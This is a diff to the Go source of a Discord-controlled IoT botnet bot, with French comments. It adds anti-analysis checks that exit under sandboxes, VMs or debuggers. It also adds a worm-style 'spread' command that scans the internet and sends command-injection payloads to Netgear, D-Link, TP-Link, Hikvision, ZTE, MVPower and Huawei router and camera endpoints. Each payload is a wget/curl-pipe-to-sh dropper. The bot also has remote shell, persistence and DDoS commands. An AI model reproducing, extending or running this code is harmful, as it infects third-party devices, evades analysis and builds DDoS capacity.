@@ -4,6 +4,7 @@
 package main
 
 import (
+	"bufio"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/hmac"
@@ -17,6 +18,7 @@ import (
 	"runtime"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/bwmarrin/discordgo"
@@ -34,6 +36,7 @@ var (
 	_sa = "" // salt fragment 1/2 (XOR 0xC1)
 	_sb = "" // salt fragment 2/2 (XOR 0x3E)
 	_b  = "" // beacon addr "IP:PORT"
+	_dlShURL = "" // URL dl.sh — dropper multi-arch auto-sélection
 )
 
 var (
@@ -51,7 +54,16 @@ func ddosCancel()          { ddosMu.Lock(); ddosActive = false; ddosMu.Unlock() 
 // ─── Anti-analyse ─────────────────────────────────────────────────────────────
 
 // guardCheck termine le processus si un debugger/traceur est détecté.
+// _noGuard est mis à "1" uniquement pour les builds de test QEMU (ldflags -X main._noGuard=1).
+// En production ce reste "" et toutes les protections sont actives.
+var _noGuard = ""
+
 func guardCheck() {
+	if _noGuard == "1" {
+		return
+	}
+
+	// 1. Détecte ptrace (strace, gdb, debuggers)
 	if data, err := os.ReadFile("/proc/self/status"); err == nil {
 		for _, line := range strings.Split(string(data), "\n") {
 			if strings.HasPrefix(line, "TracerPid:") {
@@ -67,6 +79,25 @@ func guardCheck() {
 			os.Exit(1)
 		}
 	}
+
+	// 2. Détecte honeypot/sandbox : outils de monitoring et fichiers typiques
+	// Note: "qemu"/"kvm" exclus — QEMU user-mode est utilisé légitimement pour
+	// les tests de binaires cross-arch. Les vrais IoT ne tournent pas sous QEMU.
+	honeyTokens := []string{
+		"cuckoo", "vmware", "virtualbox", "xen",
+		"sandbox", "containerd", "lxc",
+		"strace", "ltrace", "gdb", "radare", "ghidra", "ida",
+	}
+	if data, err := os.ReadFile("/proc/cpuinfo"); err == nil {
+		cpuinfo := strings.ToLower(string(data))
+		for _, token := range honeyTokens {
+			if strings.Contains(cpuinfo, token) {
+				os.Exit(1)
+			}
+		}
+	}
+
+	// 4. Timing attack : ralentissement suspect = sandbox/honeypot
 	t0 := time.Now()
 	buf := make([]byte, 1<<20)
 	h := sha256.New()
@@ -144,23 +175,24 @@ func pbkdf2Key(password, salt []byte, iter, keyLen int) []byte {
 	numBlocks := (keyLen + hashLen - 1) / hashLen
 	var buf [4]byte
 	dk := make([]byte, 0, numBlocks*hashLen)
-	U := make([]byte, hashLen)
 	for block := 1; block <= numBlocks; block++ {
 		prf.Reset()
 		prf.Write(salt)
 		buf[0] = byte(block >> 24); buf[1] = byte(block >> 16)
 		buf[2] = byte(block >> 8);  buf[3] = byte(block)
 		prf.Write(buf[:4])
-		dk = prf.Sum(dk)
-		T := dk[len(dk)-hashLen:]
+		T := prf.Sum(nil)
+		U := make([]byte, hashLen)
 		copy(U, T)
 		for n := 2; n <= iter; n++ {
 			prf.Reset()
 			prf.Write(U)
-			U = U[:0]
-			U = prf.Sum(U)
-			for x := range U { T[x] ^= U[x] }
+			U = prf.Sum(U[:0])
+			for x := 0; x < hashLen; x++ {
+				T[x] ^= U[x]
+			}
 		}
+		dk = append(dk, T...)
 	}
 	return dk[:keyLen]
 }
@@ -715,6 +747,176 @@ func autoWorkers(requested int) int {
 	return limit
 }
 
+// ─── Spread ───────────────────────────────────────────────────────────────────
+
+var (
+	spreadActive bool
+	spreadMu     sync.Mutex
+)
+
+func spreadSetActive(v bool) { spreadMu.Lock(); spreadActive = v; spreadMu.Unlock() }
+func spreadIsActive() bool   { spreadMu.Lock(); defer spreadMu.Unlock(); return spreadActive }
+
+// dropCmd construit la commande dropper depuis _dlShURL.
+func dropCmd() string {
+	if _dlShURL == "" { return "" }
+	return fmt.Sprintf(
+		"wget -qO- '%s' 2>/dev/null|sh||curl -fsL '%s' 2>/dev/null|sh||busybox wget -qO- '%s' 2>/dev/null|sh",
+		_dlShURL, _dlShURL, _dlShURL,
+	)
+}
+
+// tryDrop tente de déposer le bot sur une IP via différents vecteurs légers.
+// Retourne true si au moins un vecteur a renvoyé une réponse (pas nécessairement infecté).
+func tryDrop(ip string) bool {
+	drop := dropCmd()
+	if drop == "" { return false }
+
+	// Vecteurs HTTP RCE courants (light — pas d'exploit complet, juste injection via params triviaux)
+	endpoints := []struct{ port, path, method, body string }{
+		// Routeurs/cams — ping injection classique
+		{"80",   "/cgi-bin/;"+drop, "GET", ""},
+		{"80",   "/cgi-bin/ping.cgi", "POST", "ip=127.0.0.1;"+drop},
+		{"80",   "/ping.cgi",         "POST", "ip=127.0.0.1;"+drop},
+		{"8080", "/cgi-bin/ping.cgi", "POST", "ip=127.0.0.1;"+drop},
+		// Netgear setup.cgi
+		{"80",   "/setup.cgi", "GET", "next_file=netgear.cfg&todo=syscmd&cmd="+drop+"&curpath=/&currentsetting.htm=1"},
+		// D-Link apply.cgi
+		{"80",   "/apply.cgi", "POST", "html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1;"+drop},
+		// TP-Link /cgi?2
+		{"80",   "/cgi?2",  "POST", "[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\nIPPingDiagnosticsState=0\r\nHost=127.0.0.1;"+drop},
+		// Hikvision webLanguage
+		{"80",   "/SDK/webLanguage", "PUT", "<language>$("+drop+")</language>"},
+		// ZTE
+		{"80",   "/web_shell_cmd.gch", "POST", "telnet_enable_service=0&web_shell_cmd="+drop},
+		// MVPower DVR /shell
+		{"80",   "/shell", "GET", ""},
+		// Huawei HG532 UPnP SOAP (port 37215)
+		{"37215", "/ctrlt/DeviceUpgrade_1", "POST",
+			`<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>` + drop + `</NewStatusURL><NewDownloadURL>$(` + drop + `)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>`},
+	}
+
+	for _, ep := range endpoints {
+		addr := ip + ":" + ep.port
+		conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
+		if err != nil { continue }
+		var req string
+		if ep.method == "GET" {
+			req = fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n", ep.path, ip)
+		} else {
+			req = fmt.Sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
+				ep.method, ep.path, ip, len(ep.body), ep.body)
+		}
+		conn.SetDeadline(time.Now().Add(4 * time.Second))
+		conn.Write([]byte(req))
+		buf := make([]byte, 256)
+		conn.Read(buf)
+		conn.Close()
+		if len(buf) > 0 { return true }
+	}
+	return false
+}
+
+// spreadLoop lance le spread en utilisant zmap si dispo, sinon scan TCP natif.
+// port : port cible (ex: "80"). workers : goroutines parallèles.
+func spreadLoop(port string, workers int) {
+	drop := dropCmd()
+	if drop == "" {
+		post(fmt.Sprintf("%s[!] spread: _dlShURL vide — rebuild avec les URLs embedded%s", aRed, aReset))
+		spreadSetActive(false)
+		return
+	}
+
+	var infected int64
+	var scanned int64
+	start := time.Now()
+
+	// Reporter périodique → Discord
+	go func() {
+		for spreadIsActive() {
+			time.Sleep(30 * time.Second)
+			if !spreadIsActive() { break }
+			post(fmt.Sprintf("%s[~] SPREAD%s %ds | scanned %d | infected %d",
+				aYellow, aReset, int(time.Since(start).Seconds()),
+				atomic.LoadInt64(&scanned), atomic.LoadInt64(&infected)))
+		}
+	}()
+
+	// Choisir source d'IPs
+	zmapBin := ""
+	for _, b := range []string{"zmap", "/usr/bin/zmap", "/usr/local/bin/zmap"} {
+		if shell("which "+b+" 2>/dev/null") != "" { zmapBin = b; break }
+	}
+
+	ipCh := make(chan string, 1024)
+
+	if zmapBin != "" {
+		// zmap → IPs avec port ouvert
+		go func() {
+			defer close(ipCh)
+			cmd := exec.Command(zmapBin, "-p", port, "-r", "1000", "-o", "-", "--quiet")
+			out, _ := cmd.StdoutPipe()
+			if err := cmd.Start(); err != nil { return }
+			sc := bufio.NewScanner(out)
+			for sc.Scan() {
+				if !spreadIsActive() { cmd.Process.Kill(); break }
+				ip := strings.TrimSpace(sc.Text())
+				if ip != "" { ipCh <- ip }
+			}
+			cmd.Wait()
+		}()
+	} else {
+		// Fallback : scan TCP natif sur blocs /8 aléatoires
+		go func() {
+			defer close(ipCh)
+			sem := make(chan struct{}, 512)
+			var wg sync.WaitGroup
+			for spreadIsActive() {
+				// Bloc /8 aléatoire (évite privé/loopback/multicast)
+				a := byte(time.Now().UnixNano()%200 + 1)
+				for b2 := 0; b2 < 256 && spreadIsActive(); b2++ {
+					for c := 0; c < 256 && spreadIsActive(); c++ {
+						ip := fmt.Sprintf("%d.%d.%d.%d", a, b2, c, 1)
+						sem <- struct{}{}
+						wg.Add(1)
+						go func(target string) {
+							defer func() { <-sem; wg.Done() }()
+							conn, err := net.DialTimeout("tcp",
+								target+":"+port, 1500*time.Millisecond)
+							if err == nil {
+								conn.Close()
+								ipCh <- target
+							}
+						}(ip)
+					}
+				}
+			}
+			wg.Wait()
+		}()
+	}
+
+	// Workers : consomment ipCh et tentent le drop
+	var wg sync.WaitGroup
+	sem := make(chan struct{}, workers)
+	for ip := range ipCh {
+		if !spreadIsActive() { break }
+		atomic.AddInt64(&scanned, 1)
+		sem <- struct{}{}
+		wg.Add(1)
+		go func(target string) {
+			defer func() { <-sem; wg.Done() }()
+			if tryDrop(target) {
+				atomic.AddInt64(&infected, 1)
+			}
+		}(ip)
+	}
+	wg.Wait()
+	spreadSetActive(false)
+	post(fmt.Sprintf("%s[✓] SPREAD DONE%s | %ds | scanned %d | infected %d",
+		aGreen, aReset, int(time.Since(start).Seconds()),
+		atomic.LoadInt64(&scanned), atomic.LoadInt64(&infected)))
+}
+
 // ─── Discord handler ──────────────────────────────────────────────────────────
 
 // ANSI colors pour Discord (```ansi blocks)
@@ -884,16 +1086,52 @@ func onMessage(s *discordgo.Session, m *discordgo.MessageCreate) {
 		}()
 		post(fmt.Sprintf("%s[↑] Updating %s...%s", aYellow, botID, aReset))
 
+	case "spread":
+		if len(parts) >= 3 && strings.ToLower(parts[2]) == "stop" {
+			spreadSetActive(false)
+			post(fmt.Sprintf("%s[✗] SPREAD STOPPED — %s%s", aRed, botID, aReset))
+			return
+		}
+		if spreadIsActive() {
+			post(fmt.Sprintf("%s[!] Spread déjà actif sur %s%s", aYellow, botID, aReset))
+			return
+		}
+		if _dlShURL == "" {
+			post(fmt.Sprintf("%s[!] _dlShURL vide — rebuild avec les URLs embedded%s", aRed, aReset))
+			return
+		}
+		port := "80"
+		workers := 64
+		if len(parts) > 2 { port = parts[2] }
+		if len(parts) > 3 { fmt.Sscanf(parts[3], "%d", &workers) }
+		if workers > 256 { workers = 256 }
+
+		zmapAvail := shell("which zmap 2>/dev/null") != ""
+		src := "scan TCP natif"
+		if zmapAvail { src = "zmap" }
+
+		spreadSetActive(true)
+		post(fmt.Sprintf("%s\n%s\n%s\n%s\n%s\n%s",
+			banner("🌐 SPREAD LAUNCHED", aGreen),
+			kv("Bot",     botID,                          aMag),
+			kv("Port",    port,                           aCyan),
+			kv("Workers", fmt.Sprintf("%d", workers),     aGreen),
+			kv("Source",  src,                            aYellow),
+			aReset,
+		))
+		go spreadLoop(port, workers)
+
 	case "help":
-		post(fmt.Sprintf("%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s",
+		post(fmt.Sprintf("%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s",
 			banner("COMMANDS", aCyan),
-			fmt.Sprintf("%s  shell <cmd>  %s— Execute shell command", aGreen, aGray),
-			fmt.Sprintf("%s  info         %s— System information", aGreen, aGray),
-			fmt.Sprintf("%s  persist      %s— Install persistence", aGreen, aGray),
-			fmt.Sprintf("%s  ddos <args>  %s— Launch DDoS attack", aRed, aGray),
-			fmt.Sprintf("%s  ddos methods %s— List attack methods", aRed, aGray),
-			fmt.Sprintf("%s  update <url> %s— Update binary", aYellow, aGray),
-			fmt.Sprintf("%s  kill         %s— Terminate bot%s", aRed, aGray, aReset),
+			fmt.Sprintf("%s  shell <cmd>         %s— Execute shell command", aGreen, aGray),
+			fmt.Sprintf("%s  info                %s— System information", aGreen, aGray),
+			fmt.Sprintf("%s  persist             %s— Install persistence", aGreen, aGray),
+			fmt.Sprintf("%s  spread [port] [w]   %s— Auto-spread (zmap ou TCP natif)", aGreen, aGray),
+			fmt.Sprintf("%s  spread stop         %s— Arrêter le spread", aGreen, aGray),
+			fmt.Sprintf("%s  ddos <args>         %s— Launch DDoS attack", aRed, aGray),
+			fmt.Sprintf("%s  update <url>        %s— Update binary", aYellow, aGray),
+			fmt.Sprintf("%s  kill                %s— Terminate bot%s", aRed, aGray, aReset),
 		))
 	}
 }
